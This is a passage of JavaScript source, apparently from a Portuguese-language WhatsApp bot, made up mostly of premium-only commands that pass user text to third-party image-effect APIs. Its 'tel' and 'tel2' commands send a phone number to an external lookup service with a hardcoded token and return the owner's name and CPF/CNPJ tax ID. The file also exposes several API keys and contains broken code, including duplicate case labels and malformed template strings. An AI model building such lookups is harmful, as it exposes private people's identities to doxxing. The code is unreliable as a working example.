texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3dglue?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'metaldarkgold':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/MetalDarkGold?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'neonlight':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/NeonLight?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '1917':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/1917Style?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'xmascards3d':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/XmasCards3D?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'blood':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Blood?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'halloweenfire':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HalloweenFire?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'lava':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Lava?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'steeltext':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/SteelText?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'captainamerica':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/CaptainAmerica?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'toxic':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Toxic?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'chocolate':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Chocolate?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'matrix':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Matrix?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'horrorblood':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/HorrorBlood?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'thunder2':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/Thunder2?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dbox':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3DBox?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'naturalleaves':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/natural-leaves?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'blackpink':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/black-pink?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'dropwater':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/drop-water?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'christmas':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/christmas?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case '3dgradient':  //by Ꮥꪖꪗꪮ </>

if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Exemplo: ${prefix + command} tomioka`)
texto = args.join(" ")
enviar(`[❗] aguarde..`)
anu = await fetchJson(`https://tomioka-api.herokuapp.com/api/textpro/3d-gradient?apikey=sayoez&text=${texto}`)
buffer = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buffer, image, {caption: `prontinho ⚡`, quoted: tomio, contextInfo: tome, contextInfo: null})
break
case 'tagg':
if (!isGroupAdmins) return enviar('Você precisa ser adm')
const tag = `‼️𝑶𝑩𝑹𝑰𝑮𝑨𝑻𝑶́𝑹𝑰𝑶 𝑼𝑺𝑶 𝑫𝑨 𝑻𝑨𝑮‼️

𝛹
𝛹(nick)𝛹
♕(nick)♛
(Nick)🔱🔥
🔱🔥(Nick)

𝙏𝘼͢ 𝙄𝙈𝙋𝙀͢͢𝙍𝙄𝙐͢𝙈,𝙏𝘼 𝘾͢𝙊𝙈 𝘿𝙀͢𝙐𝙎🔱͢🔥`
enviar(tag)
break
case 'halloween':
if (!isPremium) return enviar ('só premium')
if (args.length == 0) return enviar(`Use: ${prefix + command} text\nExemplo: ${prefix + command} Bot`)
txt = args.join(" ")
buffer = await getBuffer(`https://pencarikode.xyz/api/textpro/halloween?text=${txt}&apikey=pais`)
tomioka.sendMessage(from, buffer, image, {caption: 'está ai', quoted: tomio, contextInfo: tome, thumbnail:null})
break
case 'space':
if (!isPremium) return enviar ('só premium')
team = body.slice(6)
teks1 = team.split("|")[0];
teks2 = team.split("|")[1];
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/space-3d?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome})
break
case 'playy':

case 'lagu':

if (args.length < 1) return enviar('O que você deseja procurar?')

teks = args.join(' ')

enviar('ᴘᴏʀ ғᴀᴠᴏʀ, ᴇsᴘᴇʀᴇ..')

if (!teks.endsWith("-doc")){

res = await yts(`${teks}`).catch(e => {

enviar('_ [!] O erro de consulta inserido não existe_')

})

enviar(`.Playing ${res.all[0].title}`)
let thumbInfo = `* TOMIOKABOT *
* Título: * ${res.all[0].title}
*ID do vídeo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualizações: * ${res.all[0].views}
* Duração: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

/////////////sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_[!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, audio, {quoted: msg, mimetype: 'audio/mp4', filename: res[0].output})

}

if (teks.endsWith("-doc")){

const tec = teks.split("-doc")

res = await yts(`${tec}`).catch(e => {

enviar ('_ [!] Erro de consulta que você inseriu em falta_')
})
enviar(`.Playing ${res.all[0].title}`)
let thumbInfo = `* TOMIOKABOT *
* Título: * ${res.all[0].title}
*ID do vídeo: * ${res.all[0].videoId}
* Carregado em: * ${res.all[0].ago} 
* Visualizações: * ${res.all[0].views}
* Duração: * ${res.all[0].timestamp}
* Canal: * ${res.all[0].author.name}
* Canal do link: * ${res.all[0].author.url}

* _Aguarde o processo de upload ....._ *
`

sendFileFromUrl(res.all[0].image, image, {quoted: msg, caption: thumbInfo})

res = await y2mateA(res.all[0].url).catch(e => {

enviar('_ [!  ] Erro ao entrar no Y2mate_ Web')

})

sendFileFromUrl(res[0].link, document, {quoted: msg, mimetype: 'audio/mp3', filename: res[0].output})

}

break

case 'glitch2':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(8)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[❗]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch1?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'glitch':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(7)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch2?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'demon':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(6)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/demon?apikey=darling&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'toxic':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(6)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/toxic?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'transformer':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(12)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/transformer?apikey=apiteam&texto=team=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'graffiti':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(9)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[❗]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/graffiti?apikey=apiteam&texto1=${teks1}&texto2={teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'blackpink':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(10)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[❗]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/glitch1?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'thunder':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(8)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/thunder?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'thunderv2':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(10)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/thunderv2?apikey=apiteam&texto=team=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'harrypotter':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(12)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/harrypotter2?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'pornhub':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(8)
teks1 = teks.split("|")[0];
teks2 = teks.split("|")[1];
enviar('[❗]ESPERE ...')
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/pornhub?apikey=apiteam&texto1=${teks1}&texto2=${teks2}`)
buff = await getBuffer(team.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'neon3d':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(7)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/neon3d?texto=${teks}&apikey=apiteam`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'horrorblood':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(12)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/horror-blood?texto=${teks}&apikey=apiteam`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'neondevil':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(10)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/neon-devil?texto=${teks}&apikey=apiteam`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'dropwater':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(10)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/dropwater?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'advancedglow':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(13)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/advanced-glow?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'wonderfulgraffiti':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(18)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/wonderful-graffiti?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'dropwater':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(10)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/dropwater?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'captainamerica':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(15)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/captain-america?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'jokerlogo':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(10)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/jokerlogo?apikey=apiteam&texto=${teks}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'marvel':
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar('Cadê o texto?')
teks = body.slice(7)
enviar('[❗]ESPERE ...')
anu = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/marvel?apikey=apiteam&texto1=${teks1}&texto2={teks2}`)
buff = await getBuffer(anu.resultado)
tomioka.sendMessage(from, buff, image, {quoted: tomio, contextInfo: tome})
break
case 'lavatext':
if (!isPremium) return enviar ('só premium')
team = body.slice(9)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/lava-text?apikey=apiteam&texto1=${team}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'magma':
if (!isPremium) return enviar ('só premium')
team = body.slice(6)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/magma-text?apikey=apiteam&texto=${team}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'matrix':
if (!isPremium) return enviar ('só premium')
team = body.slice(7)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/matrix-text?texto=${team}&apikey=apiteam`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'breakwall':
if (!isPremium) return enviar ('só premium')
team = body.slice(10)
team = await fetchJson(`https://api-team-of-hero.herokuapp.com/api/textpro/break-wall?apikey=apiteam&texto=${team}`)
of = await getBuffer(team.resultado)
hero = await getBuffer(`https://i.ibb.co/3h6M64p/48bb51875d47.jpg`)
tomioka.sendMessage(from, of, image, {quoted: tomio, contextInfo: tome, thumbnail: hero})
break
case 'tel':
        if (!isPremium) return enviar ('só premium')
teks = body.slice(4)
anu = await fetchJson(`http://ifind.chapada.com.br:7777/?token=30491c06-5675-4e06-b2ae-4e3fcda2abdd&tel=${teks}`)
ipl = `busca encomtrada!

➸ *nome:* ${anu.nome}
➸ *cpf_cnpj*: ${anu.cpf_cnpj}
➸ *tipo*: ${anu.tipo}
➸ *operadora*: ${anu.operadora}`
enviar(ipl)
break
case 'tel2':
if (args.length == 0) return
query = args.join(" ")
get_result = await fetchJson(`http://ifind.chapada.com.br:7777/?token=20491c06-5675-4e06-b2ae-4e3fcda2abdd&tel=${query}`)
for (var x of get_result) {
ini_mn1k += `Nome : ${x.NOME}\n`
ini_mn2k += `cpf_cpnj : ${x.CPF_CNPJ}\n`
}
enviar(ini_mn1k)
enviar(ini_mn2k)
break
case 'nulis': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar ('comando é usado assim ${prefix}textmar texto')
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/underwater?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '🌺prontinho mano🌺'})
break
case 'textmar': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar ('comando é usado assim ${prefix}textmar texto')
teks = body.slice(8)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/underwater?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '🌺prontinho mano🌺'})
break
case 'bneon': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 15) return enviar ('O texto é longo, até 15 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/bneon?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '🌺prontinho🌺'})
break
case 'naruto': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(7)
if (teks.length > 15) return enviar ('O texto é longo, até 15 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/naruto?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '🌺prontinho🌺'})
break
case '3dcube': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar ('comando é usado assim ${prefix} matrix texto')
teks = body.slice(7)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://hadi-api.herokuapp.com/api/photoxy/under-cube?teks=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '🌺prontinho mano🌺'})
break

case 'cross': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)
teks = body.slice(6)
if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')
enviar('*Estou fazendo, se der erro tente novamente ✓*')
buffer = await getBuffer(`https://api.zeks.xyz/api/crosslogo?apikey=cAdmS2XqIbRSP3vYAdqHvYqAD6W&text=${teks}`)
tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '😊ta ai'})
break
case 'wolf': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)

teks = body.slice(7)

if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')

enviar('*Estou fazendo, se der erro tente novamente ✓*')

buffer = await getBuffer(`https://api.zeks.xyz/api/wolflogo?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text1=${teks}&text2=${teks}`)

tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '😊ta ai'})

break


case 'flame': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)

teks = body.slice(7)

if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')

enviar('*Estou fazendo, se der erro tente novamente ✓*')

buffer = await getBuffer(`https://api.zeks.xyz/api/flametext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)

tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '😊ta ai'})

break
case 'ytsrc':     //case by: Bielzinho-Bot // nao remova os créditos
if (!isPremium) return enviar ('só premium')
teks = body.slice(7)  
anu = await fetchJson(`http://brizas-api.herokuapp.com/sociais/youtubesrc?apikey=brizaloka&query=${teks}`)
const objs = []
for(i=0;i< anu.resultados.length; ++i) {
let data = {
rowId: `${prefix}playy `+ anu.resultados[i].title,
title: `${prefix}tocar`,
description: anu.resultados[i].title
}
objs.push(data)
}
payload = {
listMessage: {
title: "✅ Músicas encotradas ✅",
buttonText: "Mostra lista de músicas",
description: `Palavra chave: ${teks}`,
listType: 1,
sections: [
{
title: "Músicas relacionadas",
rows: objs
}
]
}
}
let preparedPayload = await tomioka.prepareMessageFromContent(from, payload,{});
await tomioka.relayWAMessage(preparedPayload, {waitForAck: true})
break
case 'sky': 
if (!isPremium) return enviar ('só premium')
if (args.length < 1) return enviar (mess.blank)

teks = body.slice(7)

if (teks.length > 10) return enviar ('O texto é longo, até 10 caracteres')

enviar('*Estou fazendo, se der erro tente novamente ✓*')

buffer = await getBuffer(`https://api.zeks.xyz/api/skytext?apikey=hAin9sRj99puPHGV5KU1tDEizr7&text=${teks}`)

tomioka.sendMessage(from, buffer, image, {quoted: msg, thumbnail: null, caption: '😊ta ai'})

break
case 'litig': 
